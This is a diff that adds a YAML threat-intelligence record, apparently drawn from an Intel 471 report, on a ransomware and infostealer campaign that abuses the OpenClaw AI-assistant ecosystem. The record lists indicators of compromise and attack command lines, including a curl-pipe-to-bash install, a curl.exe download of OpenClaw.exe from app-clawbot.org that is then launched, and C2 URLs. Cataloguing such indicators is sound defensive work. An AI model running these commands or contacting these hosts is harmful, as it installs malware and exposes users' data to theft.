@@ -1,0 +1,61 @@
+description: CrazyHunter ransomware campaign targeting healthcare, leveraging OpenClaw
+  ecosystem for malware distribution.
+malware_families:
+- Stealc_v2
+- AMOS
+- OpenClaw
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - App.exe
+  - curl.exe
+  commandline:
+  - curl -fsSL https://openclaw.ai/install.sh | bash
+  - ms-update32.exe
+  - curl.exe -k -Ss "https://app-clawbot.org/source/OpenClaw.exe" -o"%Appdata%\\OpenClaw.exe"
+  - start "" "%Appdata%\\OpenClaw.exe"
+  powershell: []
+  scripting_engine:
+  - JavaScript
+  - bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - http://146.103.127.46/5f86ff22ffb6444b.php
+  - http://<C2_SERVER>/
+  - http://188.137.246.189/laravel.php?api=api&hash=<encoded_data>&message=<encoded_data>
+  - http://188.137.246.189/laravel.php?api=log&hash
+  file_activity:
+  - Clearc0Application/App.exe
+  - Clearl_AI.dmg
+  - LunarApplication/
+  - '%Appdata%\\OpenClaw.exe'
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes:
+  - d9f0dd48745d5be7ef74ee9f2cb4640ab310a5a7d2f2f01654e15370ac5853eb
+  - 5efe3d6ff69002f2cf82683f2d866264d0836b9f02e8b52719ecbd6fecf72a62
+  - 8196b3c51e5b6519e101a5a3e8df77435ac19e9d58bfd9cbaac4b03492abc79a
+  ip_addresses:
+  - 146.103.127.46
+  - 188.137.246.189
+  domains:
+  - app-clawbot.org
+  - ai-clawbot.org
+  - clearl.co
+  - ms-25h2-download.pro
+  - ms-25h2-update.pro
+  - openclawcli.vercel.app
+  urls:
+  - https://app-clawbot[.]org
+  - https://clearl[.]co
+  - http://146.103.127.46/5f86ff22ffb6444b.php
+  - http://188.137.246.189/laravel.php?api=api&hash=<encoded_data>&message=<encoded_data>
+  - http://188.137.246.189/laravel.php?api=log&hash
+authors:
+- Intel 471 Malware Intelligence team
+reference: https://www.intel471.com/blog/openclaw-a-viral-ai-assistant-and-a-magnet-for-infostealer-malware-and-clickfix-trickery
+date_of_publication: Mar 12, 2026
+file_creation_date: March 14, 2026
